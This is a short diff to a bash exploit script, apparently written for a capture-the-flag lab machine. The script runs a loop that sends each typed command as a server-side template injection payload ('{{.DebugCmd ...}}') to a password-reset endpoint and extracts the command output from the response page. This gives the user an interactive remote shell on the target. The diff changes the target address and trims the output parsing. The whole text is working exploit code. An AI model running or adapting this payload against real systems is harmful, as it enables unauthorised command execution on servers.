@@ -19,13 +19,9 @@ while true; do
     cmd=${cmd//\"/\\\"}
     
     # Send payload and extract response
-    response=$(curl -s 'http://10.10.11.113:8080/forgot/' \
+    response=$(curl -s "http://10.129.95.236:8080/forgot/" \
         -d "email={{.DebugCmd \"$cmd\"}}" \
-        | grep -oP "Email Sent To: \K(.*?)(?=\s+<button class)" \
-        | sed 's/&quot;/"/g' \
-        | sed 's/&lt;/</g' \
-        | sed 's/&gt;/>/g' \
-        | sed 's/&amp;/\&/g')
+        | grep -oP "Email Sent To: \K.*?(?=\s+<button)")
     
     # Print response
     echo -e "$response"
